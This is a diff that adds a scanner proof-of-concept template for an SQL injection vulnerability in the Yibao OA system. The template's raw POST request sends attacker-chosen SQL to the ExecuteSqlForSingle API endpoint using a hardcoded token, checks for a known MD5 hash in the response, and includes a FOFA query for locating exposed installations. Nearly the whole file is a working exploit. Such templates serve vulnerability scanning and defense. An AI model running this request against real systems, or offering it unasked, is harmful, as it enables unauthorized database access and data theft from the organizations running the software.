@@ -1,0 +1,42 @@
+id: poc-vh8s7su0lhg65fgz
+info:
+  name: 易宝OA ExecuteSqlForSingle SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vh8s7su0lhg65fgz'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vh8s7su0lhg65fgz
+    fofa: product="顶讯科技-易宝OA系统"
+http:
+- raw:
+  - 'POST /api/system/ExecuteSqlForSingle HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''123456'')),3,32)&strParameters
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    e10adc3949ba59abbe56e057f20f883e
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
